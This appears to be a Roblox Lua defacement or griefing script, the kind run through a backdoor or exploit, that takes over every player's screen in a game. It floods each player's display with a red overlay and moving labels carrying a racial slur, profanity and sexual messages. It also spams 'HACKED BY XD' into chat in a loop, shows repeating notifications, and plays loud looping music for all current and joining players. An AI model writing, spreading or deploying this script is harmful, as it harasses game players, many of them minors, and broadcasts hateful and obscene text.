local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local screenMessages = {
    "HACKED BY XD 🥴",       "WE FUCKED ROBLOX 🤪",
    "WE LOVE NİGGA 😁", "ROBLOX İS NİGGA 🥔", "WE LOVE PORN 😁"
}

local notificationMessages = {
    "HACKED BY XD", "HACKED BY XD",
    "HACKED BY XD", "HACKED BY XD"
}

local function createScreenGui(player)
    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "ScreenEffect"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    -- Kırmızı Arkaplan
    local bg = Instance.new("Frame", gui)
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    bg.BackgroundTransparency = 0.8
    bg.BorderSizePixel = 0

    -- Hareketli yazılar
    for i = 1, 40 do
        local label = Instance.new("TextLabel", gui)
        label.Size = UDim2.new(0, 200, 0, 30)
        label.BackgroundTransparency = 1
        label.TextColor3 = Color3.new(1, 1, 1)
        label.Font = Enum.Font.Code
        label.TextScaled = true
        label.Text = screenMessages[math.random(#screenMessages)]
        label.Position = UDim2.new(math.random(), 0, math.random(), 0)

        coroutine.wrap(function()
            while true do
                TweenService:Create(label, TweenInfo.new(0.5), {
                    Position = UDim2.new(math.random(), 0, math.random(), 0)
                }):Play()
                TweenService:Create(label, TweenInfo.new(0.2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {
                    TextTransparency = 0.4
                }):Play()
                wait(1)
            end
        end)()
    end
end

local function createNotifications(player)
    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "NotificationUI"
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false

    coroutine.wrap(function()
        while true do
            local box = Instance.new("Frame", gui)
            box.Size = UDim2.new(0, 300, 0, 50)
            box.Position = UDim2.new(1, -10, 1, -10)
            box.AnchorPoint = Vector2.new(1, 1)
            box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
            box.BackgroundTransparency = 0.1

            local txt = Instance.new("TextLabel", box)
            txt.Size = UDim2.new(1, -20, 1, -20)
            txt.Position = UDim2.new(0, 10, 0, 10)
            txt.BackgroundTransparency = 1
            txt.TextColor3 = Color3.new(1, 1, 1)
            txt.Font = Enum.Font.Code
            txt.TextScaled = true
            txt.Text = notificationMessages[math.random(#notificationMessages)]

            wait(4)

            TweenService:Create(box, TweenInfo.new(1), {
                Position = box.Position + UDim2.new(0, 0, 0, 60),
                BackgroundTransparency = 1
            }):Play()
            TweenService:Create(txt, TweenInfo.new(1), {
                TextTransparency = 1
            }):Play()

            wait(1)
            box:Destroy()
        end
    end)()
end

local function spamChat(player)
    coroutine.wrap(function()
        while true do
            local success, err = pcall(function()
                game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("HACKED BY XD", "All")
            end)
            wait(1.5)
        end
    end)()
end

local function playMusic()
    local sound = Instance.new("Sound", workspace)
    sound.SoundId = "rbxassetid://1839247124"
    sound.Volume = 3
    sound.Looped = true

    sound.Loaded:Connect(function()
        sound:Play()
    end)
end

for _, player in pairs(Players:GetPlayers()) do
    createScreenGui(player)
    createNotifications(player)
    spamChat(player)
end

Players.PlayerAdded:Connect(function(player)
    createScreenGui(player)
    createNotifications(player)
    spamChat(player)
end)

playMusic()
